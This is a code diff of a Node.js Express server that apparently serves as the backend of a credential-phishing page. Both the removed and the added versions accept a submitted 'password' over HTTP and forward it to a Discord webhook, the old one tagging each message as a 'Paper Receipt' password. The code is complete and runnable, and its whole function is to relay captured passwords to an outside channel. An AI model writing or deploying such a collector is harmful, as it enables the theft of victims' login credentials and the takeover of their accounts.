@@ -1,30 +1,47 @@
-require("dotenv").config();
-const express = require("express");
-const axios = require("axios");
-const cors = require("cors");
+const express = require('express');
+const bodyParser = require('body-parser');
+const fetch = require('node-fetch'); // Used to send requests to Discord
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const port = process.env.PORT || 3000;
 
-app.use(express.json());
-app.use(cors());
+// Use JSON parsing middleware
+app.use(bodyParser.json());
 
-app.post("/send-password", async (req, res) => {
-    const { password } = req.body;
+// Discord webhook URL (set this as an environment variable in Render)
+const DISCORD_WEBHOOK_URL = process.env.WEBHOOK_URL;
 
-    if (!password) {
-        return res.status(400).json({ success: false, error: "No password provided" });
-    }
+app.post('/webhook', (req, res) => {
+    const { content } = req.body;  // Extract the content (password) from the request
 
-    try {
-        await axios.post(process.env.WEBHOOK_URL, {
-            content: `New **Paper Receipt** password: ${password}`
-        });
-        res.json({ success: true, message: "Password sent!" });
-    } catch (error) {
-        console.error("Failed to send password:", error);
-        res.status(500).json({ success: false, error: "Failed to send password" });
-    }
+    const data = {
+        content: content || 'No password provided'  // Default message if no content is sent
+    };
+
+    // Send the data to Discord
+    fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('Password successfully sent to Discord');
+            res.status(200).send('Password sent to Discord');
+        } else {
+            console.error('Failed to send password to Discord');
+            res.status(500).send('Failed to send password to Discord');
+        }
+    })
+    .catch(error => {
+        console.error('Error occurred:', error);
+        res.status(500).send('Error occurred while sending password');
+    });
 });
 
-app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
+// Start the server
+app.listen(port, () => {
+    console.log(`Server running on http://localhost:${port}`);
+});
